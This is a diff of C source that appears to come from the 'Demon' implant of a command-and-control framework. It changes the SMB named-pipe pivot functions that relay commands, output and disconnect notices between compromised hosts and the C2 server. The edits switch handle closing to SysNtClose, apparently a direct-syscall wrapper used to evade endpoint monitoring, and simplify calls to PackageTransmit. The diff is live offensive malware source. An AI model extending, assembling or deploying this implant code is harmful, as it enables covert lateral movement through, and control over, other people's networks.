@@ -64,7 +64,7 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
                 else
                 {
                     PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
-                    Instance.Win32.NtClose( Handle );
+                    SysNtClose( Handle );
                     return FALSE;
                 }
             }
@@ -72,7 +72,7 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
         else
         {
             PRINTF( "PeekNamedPipe: Failed[%d]\n", NtGetLastError() );
-            Instance.Win32.NtClose( Handle );
+            SysNtClose( Handle );
             return FALSE;
         }
     } while ( TRUE );
@@ -160,7 +160,7 @@ BOOL PivotRemove( DWORD AgentId )
         if ( Instance.SmbPivots->Handle )
         {
             Instance.Win32.DisconnectNamedPipe( Instance.SmbPivots->Handle );
-            Instance.Win32.NtClose( Instance.SmbPivots->Handle );
+            SysNtClose( Instance.SmbPivots->Handle );
         }
 
         Instance.SmbPivots->PipeName.Buffer = NULL;
@@ -192,7 +192,7 @@ BOOL PivotRemove( DWORD AgentId )
                 if ( PivotData->Handle )
                 {
                     Instance.Win32.DisconnectNamedPipe( PivotData->Handle );
-                    Instance.Win32.NtClose( PivotData->Handle );
+                    SysNtClose( PivotData->Handle );
                 }
 
                 PivotData->PipeName.Buffer = NULL;
@@ -271,7 +271,7 @@ VOID PivotPush()
                                 PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
                                 PackageAddBytes( Package, Output, BytesSize );
 
-                                PackageTransmit( Package, NULL, NULL );
+                                PackageTransmit( Package );
                             }
                             else PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
 
@@ -300,12 +300,12 @@ VOID PivotPush()
                         PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
                         PackageAddInt32( Package, Removed );
                         PackageAddInt32( Package, DemonID );
-                        PackageTransmit( Package, NULL, NULL );
+                        PackageTransmit( Package );
 
                         break;
                     }
 
-                    CALLBACK_GETLASTERROR
+                    PACKAGE_ERROR_WIN32
                     break;
                 }
 
